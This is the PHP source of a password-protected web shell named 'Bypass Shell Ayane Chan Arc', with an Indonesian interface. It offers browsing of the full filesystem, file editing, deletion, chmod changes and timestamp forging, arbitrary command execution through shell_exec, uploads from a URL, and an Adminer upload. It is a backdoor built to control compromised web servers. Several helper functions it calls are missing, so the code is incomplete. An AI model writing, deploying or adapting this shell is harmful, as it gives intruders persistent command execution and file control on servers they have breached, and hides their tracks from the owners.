<?php
session_start();

define('PASSWORD', 'ayane111'); // Password untuk kontrol akses

if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
        echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
    } else {
        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
    }
}

if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function playAudio() {
    echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    echo '
    <style>
        body {
            background-color: pink;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 20px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            background-color: white;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: pink;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 15px;
        }
        .login-card .btn {
            width: 100%;
        }
    </style>
    <div class="login-card">
        <h1>Bypass Shell Ayane Chan Arc</h1>
        <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div>';
    exit;
}

function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        foreach ($folders as $folder) {
            $folderPath = $dir . '/' . $folder;
            $encodedPath = urlencode(base64_encode($folderPath));
            $isRoot = $folderPath === '/';
            $style = $isRoot ? "style='color:red;'" : "";
            echo "<div class='list-group-item' $style>";
            echo "<span class='folder-item'>$folder/</span>";
            echo "<span class='folder-permissions'>" . get_permissions($folderPath) . "</span>";
            echo "<span class='folder-date'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
            echo "<button class='btn btn-warning btn-sm' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
            echo "<button class='btn btn-secondary btn-sm' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
            echo "<button class='btn btn-info btn-sm' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
            echo "<button class='btn btn-danger btn-sm' onclick=\"showForm('delete-$folder')\">Hapus</button>";
            echo "</div>";

            // Form Rename
            echo "<div id='rename-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ganti Nama</h4>
                        <label for='destination'><b>Nama Baru</b></label>
                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$folder')\">Batal</button>
                    </form>
                </div>";

            // Form Chmod
            echo "<div id='chmod-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Chmod</h4>
                        <div class='form-group'>
                            <label for='mode'><b>Mode Chmod</b></label>
                            <input type='text' placeholder='0755' name='mode' required>
                        </div>
                        <div class='form-group'>
                            <label for='manualMode'>Manual Input</label>
                            <input type='checkbox' id='manualMode-$folder' name='manualMode' onclick=\"toggleManualChmod('manualMode-$folder', 'chmodInput-$folder')\">
                        </div>
                        <div class='form-group'>
                            <input type='text' id='chmodInput-$folder' name='manualChmod' style='display:none;' placeholder='-rw-r--r--'>
                        </div>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$folder')\">Batal</button>
                    </form>
                </div>";

            // Form Ubah Tanggal
            echo "<div id='date-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Tanggal</h4>
                        <label for='newdate'><b>Tanggal Baru</b></label>
                        <input type='datetime-local' name='newdate' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='changedate' class='btn btn-primary'>Ubah Tanggal</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('date-$folder')\">Batal</button>
                    </form>
                </div>";

            // Delete Confirmation
            echo "<div id='delete-$folder' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Hapus Folder</h4>
                        <p>Apakah Anda yakin ingin menghapus folder ini?</p>
                        <input type='hidden' name='path' value='$encodedPath'>
                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$folder')\">Batal</button>
                    </form>
                </div>";
        }

        foreach ($files as $file) {
            $filePath = $dir . '/' . $file;
            $encodedPath = urlencode(base64_encode($filePath));
            $isRoot = $filePath === '/';
            $style = $isRoot ? "style='color:red;'" : "";
            echo "<div class='list-group-item' $style>";
            echo "<span class='folder-item'>$file</span>";
            echo "<span class='folder-permissions'>" . get_permissions($filePath) . "</span>";
            echo "<span class='folder-date'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
            echo "<button class='btn btn-warning btn-sm' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
            echo "<button class='btn btn-secondary btn-sm' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
            echo "<button class='btn btn-info btn-sm' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
            echo "<button class='btn btn-primary btn-sm' onclick=\"showForm('edit-$file')\">Edit</button>";
            echo "<button class='btn btn-danger btn-sm' onclick=\"showForm('delete-$file')\">Hapus</button>";
            echo "<a href='?download=$encodedPath' class='btn btn-info btn-sm'>Download</a>";
            echo "</div>";

            // Form Rename
            echo "<div id='rename-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ganti Nama</h4>
                        <label for='destination'><b>Nama Baru</b></label>
                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$file')\">Batal</button>
                    </form>
                </div>";

            // Form Chmod
            echo "<div id='chmod-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Chmod</h4>
                        <div class='form-group'>
                            <label for='mode'><b>Mode Chmod</b></label>
                            <input type='text' placeholder='0755' name='mode' required>
                        </div>
                        <div class='form-group'>
                            <label for='manualMode'>Manual Input</label>
                            <input type='checkbox' id='manualMode-$file' name='manualMode' onclick=\"toggleManualChmod('manualMode-$file', 'chmodInput-$file')\">
                        </div>
                        <div class='form-group'>
                            <input type='text' id='chmodInput-$file' name='manualChmod' style='display:none;' placeholder='-rw-r--r--'>
                        </div>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$file')\">Batal</button>
                    </form>
                </div>";

            // Form Ubah Tanggal
            echo "<div id='date-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Ubah Tanggal</h4>
                        <label for='newdate'><b>Tanggal Baru</b></label>
                        <input type='datetime-local' name='newdate' required>
                        <input type='hidden' name='source' value='$encodedPath'>
                        <button type='submit' name='changedate' class='btn btn-primary'>Ubah Tanggal</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('date-$file')\">Batal</button>
                    </form>
                </div>";

            // Form Edit
            echo "<div id='edit-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Edit File</h4>
                        <textarea name='content' rows='10' class='form-control'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
                        <input type='hidden' name='editSource' value='$encodedPath'>
                        <button type='submit' name='saveEdit' class='btn btn-primary'>Simpan</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('edit-$file')\">Batal</button>
                    </form>
                </div>";

            // Delete Confirmation
            echo "<div id='delete-$file' class='form-popup'>
                    <form method='post' class='form-container'>
                        <h4>Hapus File</h4>
                        <p>Apakah Anda yakin ingin menghapus file ini?</p>
                        <input type='hidden' name='path' value='$encodedPath'>
                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$file')\">Batal</button>
                    </form>
                </div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
    }
}

// Fungsi untuk menampilkan izin file
function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// Fungsi untuk menghapus item
function deleteItem($path) {
    $path = base64_decode(urldecode($path));
    if (is_dir($path)) {
        if (rmdir($path)) {
            echo "<div class='alert alert-success'>Direktori berhasil dihapus.</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal menghapus direktori.</div>";
        }
    } else {
        if (unlink($path)) {
            echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal menghapus file.</div>";
        }
    }
}

// Fungsi untuk rename file/folder
function renameFile($source, $destination) {
    $source = base64_decode(urldecode($source));
    if (rename($source, $destination)) {
        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
    }
}

// Fungsi untuk mengubah chmod
function changePermissions($path, $mode, $manual) {
    $path = base64_decode(urldecode($path));
    if ($manual) {
        $mode = str2oct($mode);
    } else {
        $mode = octdec($mode);
    }
    if (chmod($path, $mode)) {
        echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
    }
}

// Fungsi untuk mengubah tanggal modifikasi file
function changeDate($path, $newdate) {
    $path = base64_decode(urldecode($path));
    changeFileDate($path, $newdate);
}

// Fungsi untuk mengedit file
function editFile($path, $content) {
    $path = base64_decode(urldecode($path));
    if (file_put_contents($path, $content) !== false) {
        echo "<div class='alert alert-success'>File berhasil diedit.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengedit file.</div>";
    }
}

// Fungsi untuk menjalankan perintah terminal
function executeCommand($command, $dir) {
    chdir($dir);
    $output = shell_exec($command);
    return htmlspecialchars($output);
}

// Proses permintaan yang diterima
if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = base64_decode(urldecode($_POST['dir']));
    $filename = basename($url);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

if (isset($_FILES['file']) && isset($_POST['dir'])) {
    $uploadDir = base64_decode(urldecode($_POST['dir']));
    $filename = basename($_FILES['file']['name']);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromForm($_FILES['file'], $savePath);
}

if (isset($_POST['delete']) && isset($_POST['path'])) {
    deleteItem($_POST['path']);
}

if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destination'])) {
    renameFile($_POST['source'], $_POST['destination']);
}

if (isset($_POST['chmod']) && isset($_POST['source']) && isset($_POST['mode'])) {
    $manual = isset($_POST['manualMode']) ? true : false;
    changePermissions($_POST['source'], $_POST['mode'], $manual);
}

if (isset($_POST['changedate']) && isset($_POST['source']) && isset($_POST['newdate'])) {
    changeDate($_POST['source'], $_POST['newdate']);
}

if (isset($_POST['saveEdit']) && isset($_POST['editSource']) && isset($_POST['content'])) {
    editFile($_POST['editSource'], $_POST['content']);
}

if (isset($_POST['command']) && isset($_POST['dir'])) {
    $command = $_POST['command'];
    $dir = base64_decode(urldecode($_POST['dir']));
    $commandOutput = executeCommand($command, $dir);
}

if (isset($_GET['download'])) {
    $file = base64_decode(urldecode($_GET['download']));
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Fungsi untuk mengubah izin manual ke oktal
function str2oct($str) {
    $trans = array(
        '-' => '0', 'r' => '4', 'w' => '2', 'x' => '1', 
        's' => '4', 'S' => '0', 't' => '1', 'T' => '0'
    );
    $oct = array(0, 0, 0);
    for ($i = 0; $i < 9; $i++) {
        $oct[intval($i / 3)] += intval($trans[$str[$i]]);
    }
    return intval(implode('', $oct), 8);
}

$rootDir = '/'; // Menggunakan root direktori sistem Linux
$dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
$displayDir = realpath($dir);

$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Shell Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            min-width: 1024px;
        }

        .form-popup {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            z-index: 9;
            background-color: white;
            border: 1px solid #888;
            width: 400px;
            padding: 20px;
            box-shadow: 0px 0px 10px 0px #000;
        }

        .form-container h4 {
            margin-bottom: 15px;
        }

        .form-container input[type=text], .form-container textarea, .form-container input[type=datetime-local] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 10px 0;
            border: none;
            background: #f1f1f1;
        }

        .form-container .btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            width: 100%;
            margin-bottom:10px;
            opacity: 0.8;
        }

        .form-container .btn.cancel {
            background-color: red;
        }

        .form-container .btn:hover, .open-button:hover {
            opacity: 1;
        }

        .list-group-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ddd;
            padding: 10px 0;
        }

        .folder-item {
            flex: 2;
        }

        .folder-permissions, .folder-date {
            flex: 1;
            text-align: center;
        }
        
        .info-sites, .network-info {
            display: none;
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }

        .info-sites {
            background-color: #e9ecef;
        }

        .network-info {
            background-color: #e2e3e5;
        }
    </style>
</head>
<body style="background-color: pink;">
    <div class="container mt-5">
        <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
        <div class="text-center mb-4">
            <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
        </div>
        <div class="text-center mb-4">
            <form method="post" class="d-inline">
                <button type="submit" name="logout" class="btn btn-danger">Logout</button>
            </form>
            <button class="btn btn-primary" onclick="toggleInfoSites()">Informasi Web</button>
            <button class="btn btn-secondary" onclick="toggleNetworkInfo()">Network Info</button>
            <button class="btn btn-success" onclick="showForm('uploadAdminer')">Upload Adminer</button>
        </div>

        <!-- Informasi Web -->
        <div id="infoSites" class="info-sites">
            <?php displaySystemInfo(); ?>
        </div>

        <!-- Informasi Jaringan -->
        <div id="networkInfo" class="network-info">
            <?php displayNetworkInfo(); ?>
        </div>

        <!-- Upload Adminer -->
        <div id="uploadAdminer" class="form-popup">
            <form method="post" class="form-container">
                <h4>Upload Adminer</h4>
                <label for="adminerFile"><b>Nama File Adminer</b></label>
                <input type="text" id="adminerFile" name="adminerFile" placeholder="adminer.php" required>
                <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
                <button type="submit" name="uploadAdminer" class="btn btn-primary">Upload</button>
                <button type="button" class="btn btn-secondary" onclick="hideForm('uploadAdminer')">Batal</button>
            </form>
        </div>

        <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
        <form method="post">
            <div class="form-group">
                <label for="url">URL File</label>
                <input type="text" id="url" name="url" class="form-control" placeholder="Masukkan URL file" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Upload dari URL</button>
        </form>
        
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Pilih File untuk Diupload</label>
                <input type="file" id="file" name="file" class="form-control" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Upload File</button>
        </form>

        <h2 class="mt-4">Daftar Direktori</h2>
        <div class="alert alert-info">
            <strong>Direktori Saat Ini:</strong> 
            <a href="?dir=<?php echo urlencode(base64_encode($rootDir)); ?>" class="btn btn-link">Home</a> 
            <?php
            $currentPath = '/';
            echo "<a href='?dir=" . urlencode(base64_encode('/')) . "' class='btn btn-link'>/</a> ";
            foreach ($dirArray as $index => $folder) {
                $currentPath .= htmlspecialchars($folder) . '/';
                $encodedPath = urlencode(base64_encode($currentPath));
                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
                if ($index < count($dirArray) - 1) {
                    echo " / ";
                }
            }
            ?>
        </div>
        <div class="list-group">
            <?php
            display_path_links($dir);
            ?>
        </div>

        <h2 class="mt-4">Terminal</h2>
        <form method="post">
            <div class="form-group">
                <label for="command">Command</label>
                <input type="text" id="command" name="command" class="form-control" placeholder="Masukkan perintah" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
            <button type="submit" class="btn btn-primary">Jalankan</button>
        </form>
        <?php if (isset($commandOutput)): ?>
            <pre class="mt-4"><?php echo $commandOutput; ?></pre>
        <?php endif; ?>

        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc</small>
        </footer>
        <?php else: ?>
        <!-- Konten halaman login jika belum terautentikasi -->
        <?php endif; ?>
    </div>
    <script>
        function showForm(formId) {
            document.getElementById(formId).style.display = 'block';
        }

        function hideForm(formId) {
            document.getElementById(formId).style.display = 'none';
        }

        function toggleInfoSites() {
            var element = document.getElementById("infoSites");
            element.style.display = (element.style.display === "none" || element.style.display === "") ? "block" : "none";
        }

        function toggleNetworkInfo() {
            var element = document.getElementById("networkInfo");
            element.style.display = (element.style.display === "none" || element.style.display === "") ? "block" : "none";
        }

        function toggleManualChmod(checkboxId, inputId) {
            var checkbox = document.getElementById(checkboxId);
            var input = document.getElementById(inputId);
            if (checkbox.checked) {
                input.style.display = "block";
            } else {
                input.style.display = "none";
            }
        }
    </script>
</body>
</html>
